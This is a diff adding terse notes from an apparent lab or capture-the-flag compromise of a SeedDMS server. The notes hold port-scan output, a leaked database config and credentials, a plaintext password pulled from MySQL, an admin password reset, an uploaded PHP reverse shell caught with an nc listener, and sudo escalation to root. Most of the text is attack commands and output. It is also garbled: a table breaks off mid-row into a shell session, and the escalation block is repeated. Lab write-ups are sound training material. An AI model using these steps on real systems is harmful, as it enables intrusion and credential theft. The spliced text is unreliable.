@@ -1,0 +1,125 @@
+PORT      STATE SERVICE VERSION
+80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Welcome to the land of pwnland
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+3306/tcp  open  mysql   MySQL 8.0.25-0ubuntu0.20.04.1
+|_ssl-date: TLS randomness does not represent time
+| mysql-info: 
+|   Protocol: 10
+|   Version: 8.0.25-0ubuntu0.20.04.1
+|   Thread ID: 38
+|   Capabilities flags: 65535
+|   Some Capabilities: ConnectWithDatabase, FoundRows, ODBCClient, LongPassword, SupportsTransactions, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, Support41Auth, IgnoreSigpipes, SwitchToSSLAfterHandshake, InteractiveClient, LongColumnFlag, DontAllowDatabaseTableColumn, SupportsCompression, Speaks41ProtocolNew, SupportsLoadDataLocal, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
+|   Status: Autocommit
+|   Salt: y86g\x12MN\gT\x18\x01QXd\x04\x03~`-
+|_  Auth Plugin Name: caching_sha2_password
+| ssl-cert: Subject: commonName=MySQL_Server_8.0.25_Auto_Generated_Server_Certificate
+| Not valid before: 2021-07-03T00:33:15
+|_Not valid after:  2031-07-01T00:33:15
+33060/tcp open  mysqlx?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
+|     Invalid message"
+|     HY000
+|   LDAPBindReq: 
+|     *Parse error unserializing protobuf message"
+|     HY000
+|   oracle-tns: 
+|     Invalid message-frame."
+|_    HY000
+
+//in the source code of the home page, we found:
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js"></script>
+    <script>window.jQuery || document.write('<script src="js/vendor/jquery-1.11.2.min.js"><\/script>')</script>
+
+    <script src="js/vendor/bootstrap.min.js"></script>
+    
+    <script src="js/datepicker.js"></script>
+    <script src="js/plugins.js"></script>
+    <script src="js/main.js"></script>
+
+//in the page main.js
+       // give active class to first link
+        //make sure this js file is same as installed app on our server endpoint: /seeddms51x/seeddms-5.1.22/
+
+//in the github page, we got the setting dirc of seeddms
+//from github https://github.com/JustLikeIcarus/SeedDMS/blob/master/conf/settings.xml.template
+http://192.168.56.111/seeddms51x/conf/settings.xml
+
+<database dbDriver="mysql" dbHostname="localhost" dbDatabase="seeddms" dbUser="seeddms" dbPass="seeddms" doNotCheckVersion="false"> </database>
+
+mysql> select * from users;
++-------------+---------------------+--------------------+-----------------+
+| Employee_id | Employee_first_name | Employee_last_name | Employee_passwd |
++-------------+---------------------+--------------------+-----------------+
+|           1 | saket               | saurav             | Saket@#$1337    |
++-------------+---------------------+--------------------+-----------------+
+1 row in set (0.01 sec)
+
+mysql> select * from tblUsers;
++----+-------+----------------------------------+---------------+--------------------+----------+-------+---------+------+--------+---------------------+---------------+----------+-------+------------+
+| id | login | pwd                              | fullName      | email              | language | theme | comment | role | hidden | pwdExpiration       | loginfailures | disabled | quota | homefolder |
++----+-------+-------------saket@ubuntu:/$ sudo -l
+sudo -l
+[sudo] password for saket: Saket@#$1337
+
+Matching Defaults entries for saket on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User saket may run the following commands on ubuntu:
+    (ALL : ALL) ALL
+saket@ubuntu:/$ /bin/bash
+/bin/bash
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+saket@ubuntu:/$ sudo /bin/bash
+sudo /bin/bash
+root@ubuntu:/#
+└─$ echo -n 'passwd' | md5sum                                                  
+76a2173be6393254e72ffa4d6df1030a
+
+mysql> update tblUsers set pwd = '76a2173be6393254e72ffa4d6df1030a' where id =1;
+Query OK, 1 row affected (0.01 sec)
+Rows matched: 1  Changed: 1  Warnings: 0
+//after login, add doc, a reverseshell php. coz ebexploit we got a vuln of seeddms system, SeedDMS versions < 5.1.11 - Remote Command Execution 
+
+http://192.168.56.111/seeddms51x/data/1048576/6/1.php
+
+└─$ nc -nvlp 8821         
+listening on [any] 8821 ...
+connect to [192.168.56.108] from (UNKNOWN) [192.168.56.111] 56670
+Linux ubuntu 5.8.0-59-generic #66~20.04.1-Ubuntu SMP Thu Jun 17 11:14:10 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+ 11:25:54 up  5:09,  0 users,  load average: 0.09, 0.10, 0.11
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+www-data@ubuntu:/$ su saket
+su saket
+Password: Saket@#$1337
+
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+saket@ubuntu:/$ sudo -l
+sudo -l
+[sudo] password for saket: Saket@#$1337
+
+Matching Defaults entries for saket on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User saket may run the following commands on ubuntu:
+    (ALL : ALL) ALL
+saket@ubuntu:/$ /bin/bash
+/bin/bash
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+saket@ubuntu:/$ sudo /bin/bash
+sudo /bin/bash
+root@ubuntu:/#
